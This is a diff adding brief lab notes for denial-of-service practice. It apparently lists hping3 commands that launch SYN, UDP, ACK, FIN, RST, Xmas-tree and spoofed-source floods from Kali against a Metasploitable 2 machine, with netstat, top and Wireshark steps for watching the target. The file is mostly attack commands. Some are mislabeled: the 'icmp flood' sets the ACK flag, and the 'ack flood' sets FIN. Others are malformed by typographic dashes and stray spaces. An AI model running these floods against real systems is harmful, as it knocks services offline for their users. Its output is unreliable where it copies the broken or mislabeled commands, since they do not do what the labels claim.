@@ -1,0 +1,35 @@
+Kali: <IP>
+Meta 2: <IP> = target
+Tools needed: hping3,top,netstat,wireshark
+1.Syn flood attack
+Hping3 –S  -P 80 –flood < target meta P 2 IP >
+
+-Go to Meta p 2 
+       netstat –an | grep :80
+Or
+top
+
+On kali
+Wireshark
+2.Udp flood
+Hping3 –udp –p 53   -- flood  <target>
+
+In meta
+Top
+3.icmp (ping) flood
+hping3 –A –p 80 – flood<target>
+              in meta
+top
+4.ack flood
+>hping3 –F –p 80 –flood< target>
+
+In meta
+             netstat -an | grep :80
+5.fin flood
+hping3 –F –p 80 –flood <target>
+6.rst flood
+>hping3 –R –p 80 –flood <target>
+7.xmas tree attack
+>hping3 –F –S –U  –p 80 –flood <target>
+8.spoofed source ip (ddos simulation)
+>hping3 –S –p 80 –flood –a  <other  machine IP> < target>
